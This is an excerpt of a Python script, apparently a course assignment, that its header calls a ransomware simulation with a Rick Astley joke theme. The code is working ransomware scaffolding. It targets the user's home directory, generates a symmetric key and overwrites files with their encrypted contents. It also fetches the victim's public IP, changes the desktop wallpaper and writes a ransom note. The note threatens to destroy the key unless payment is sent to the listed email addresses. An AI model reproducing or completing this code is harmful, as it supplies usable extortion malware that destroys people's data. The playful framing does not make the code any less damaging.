...
# Purpose:                      Create a python script that simulates ransomware
...
# Ransomware additions resourced from course github and assignment linked referenced on the readme page attached to this script.

# Load web browser
import webbrowser
# For downloading and saving background images
import urllib.request
# Make get requests api.ipify.org to get the ip address
import requests
...
import base64
# used for ransom note and decryption key on desktop
import threading 


class RansomWare:

    # File extensions to search and encrypt/decrypt
    file_exts = [
        'txt',
    ]
    ...
    def __init__(self):
        ...
        # Sysroot to create absolute path for files and encrypting system
        self.sysRoot = os.path.expanduser('~')
        # Use localroot to test encryption software and absolute path for files and encryption
        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing

        # Grab public IP
        self.publicIP = requests.get('https://api.ipify.org').text

    # Create [SYMMETRIC KEY] on victim machine
    def generate_key(self):
        # Generates (base64 encoded) url safe key
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)

    # Write (symmetric key) to text file
    def write_key(self):
    ...
    def crypt_file(self, file_path, encrypted=False):
        ...
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to overwrite original file
            fp.write(_data)


    # Use created [SYMMETRIC KEY] for encryption 
    ...
    def what_is_love():
        ...
        # Open browser Rick Astley
        webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://wallpapers.com/wallpapers/rick-astley-fhqknyoj3226oah3.html'
...
1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to Nevergonnagiveyouup@wtfmail.com
2. You will receive a postcard with further instructions.
   Once payment has been completed, send another email to Nevergonnaletyoudown@wtfmail.com stating "RICKROLL".
   We will check to see if payment has been paid.
3. You will receive an evite with your KEY that will unlock all your files and extra gifts.
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. Rick will never give up on you.
''')
